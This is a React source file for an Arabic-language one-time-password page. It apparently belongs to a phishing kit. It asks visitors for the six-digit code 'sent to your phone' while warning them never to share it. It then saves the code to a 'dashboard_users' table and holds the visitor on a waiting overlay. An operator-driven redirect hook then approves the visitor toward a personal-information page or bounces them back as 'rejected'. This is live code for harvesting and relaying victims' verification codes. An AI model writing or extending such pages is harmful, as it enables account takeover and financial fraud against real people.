import { useState, useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/components/ui/use-toast";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import { useAdminRedirect } from "@/hooks/use-admin-redirect";
import WaitingOverlay from "@/components/WaitingOverlay";
import otpBanner from "@/assets/otp-banner.jpg";
import { ShieldCheck, Sparkles, Lock } from "lucide-react";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";

const OTP = () => {
  const [searchParams] = useSearchParams();
  const { toast } = useToast();
  const userId = searchParams.get("uid") || "";
  const wasRejected = searchParams.get("rejected") === "true";

  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [rejectionError, setRejectionError] = useState(wasRejected);

  useEffect(() => {
    if (wasRejected) {
      setSubmitted(false);
      setRejectionError(true);
    }
  }, [wasRejected, searchParams.get("t")]);

  useAdminRedirect(userId || null, { approveRedirect: submitted ? "/personal-info" : undefined });

  useEffect(() => {
    if (!userId) return;
    supabase.from("dashboard_users").update({ last_page: "OTP" }).eq("id", userId).then();
  }, [userId]);


  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 6) {
      toast({ title: "خطأ", description: "يرجى إدخال الرمز كاملاً", variant: "destructive" });
      return;
    }
    setLoading(true);
    const { error } = await supabase
      .from("dashboard_users")
      .update({
        otp1_data: [{ otp_code: otp, timestamp: new Date().toISOString() }],
        last_page: "OTP",
        status_tabs: {},
      })
      .eq("id", userId);
    if (error) {
      toast({ title: "خطأ", description: "حدث خطأ", variant: "destructive" });
    } else {
      toast({ title: "تم", description: "تم إرسال الرمز بنجاح" });
      setSubmitted(true);
    }
    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-background relative" dir="rtl">
      <div className="fixed inset-0 gradient-mesh pointer-events-none" />
      <SiteHeader />

      <div className="relative">
        <img src={otpBanner} alt="التحقق الأمني" className="w-full h-36 object-cover" width={1024} height={512} />
        <div className="absolute inset-0 bg-gradient-to-t from-background via-background/50 to-black/40" />
        <div className="absolute inset-0 pattern-grid opacity-15" />
        <div className="absolute bottom-3 right-0 left-0 text-center">
          <h1 className="text-base font-extrabold text-white drop-shadow-[0_2px_12px_rgba(0,0,0,0.7)]">رمز التحقق</h1>
        </div>
      </div>

      <section className="py-6 px-2 relative z-10">
        <div className="w-full max-w-none px-3">
          {rejectionError && (
            <div className="bg-destructive/5 border border-destructive/20 rounded-2xl p-4 mb-4 flex items-start gap-3 animate-fade-in card-shadow">
              <span className="text-2xl mt-0.5">⚠️</span>
              <div>
                <p className="text-base font-bold text-destructive mb-0.5">بيانات غير صحيحة</p>
                <p className="text-sm text-muted-foreground leading-relaxed">البيانات المدخلة غير صحيحة، يرجى التأكد منها وإعادة إدخالها.</p>
              </div>
              <button onClick={() => setRejectionError(false)} className="text-muted-foreground hover:text-foreground text-lg mr-auto">✕</button>
            </div>
          )}

          <div className="flex items-start gap-3 bg-card/80 backdrop-blur-sm rounded-2xl p-4 mb-5 border border-border/40 card-shadow">
            <div className="w-9 h-9 rounded-xl hero-gradient flex items-center justify-center shrink-0 shadow-button">
              <Sparkles className="w-4 h-4 text-primary-foreground" />
            </div>
            <div>
              <p className="text-sm font-bold text-foreground mb-0.5">لحمايتك أكثر!</p>
              <p className="text-xs text-muted-foreground leading-relaxed">
                تم إرسال رمز التحقق إلى رقم هاتفك المسجل لدينا. أدخل الرمز المكوّن من 6 أرقام لإتمام عملية التحقق الآمن.
              </p>
            </div>
          </div>

          <div className="bg-card rounded-2xl p-6 card-shadow border border-border/30">
            <div className="flex items-center gap-2.5 pb-3 border-b border-border/30 mb-5">
              <div className="w-9 h-9 rounded-xl hero-gradient flex items-center justify-center shadow-button">
                <Lock className="w-4 h-4 text-primary-foreground" />
              </div>
              <span className="text-base font-bold text-foreground">أدخل رمز التحقق</span>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="flex justify-center" dir="ltr">
                <InputOTP maxLength={6} value={otp} onChange={setOtp}>
                  <InputOTPGroup className="gap-2">
                    {[0, 1, 2, 3, 4, 5].map((i) => (
                      <InputOTPSlot key={i} index={i} className="w-11 h-11 text-base border border-border/50 rounded-xl bg-muted/30 shadow-sm focus:ring-2 focus:ring-primary/30 focus:border-primary/50 transition-all" />
                    ))}
                  </InputOTPGroup>
                </InputOTP>
              </div>

              <Button type="submit" disabled={loading || submitted} className="w-full hero-gradient text-primary-foreground text-base font-bold py-6 rounded-xl shadow-button hover:shadow-[0_6px_24px_hsl(213_76%_44%/0.4)] transition-all">
                {loading ? "جاري التحقق..." : "تأكيد الرمز"}
              </Button>
            </form>
          </div>

          <div className="flex items-center gap-2 rounded-xl py-2.5 px-3 bg-card/60 backdrop-blur-sm border border-border/30 mt-4">
            <div className="w-7 h-7 rounded-lg hero-gradient flex items-center justify-center shrink-0">
              <ShieldCheck className="w-3.5 h-3.5 text-primary-foreground" />
            </div>
            <p className="text-xs text-muted-foreground leading-relaxed">
              رمز التحقق صالح لفترة محدودة. لا تشارك هذا الرمز مع أي شخص.
            </p>
          </div>
        </div>
      </section>
      <SiteFooter />

      {submitted && <WaitingOverlay />}
    </div>
  );
};

export default OTP;
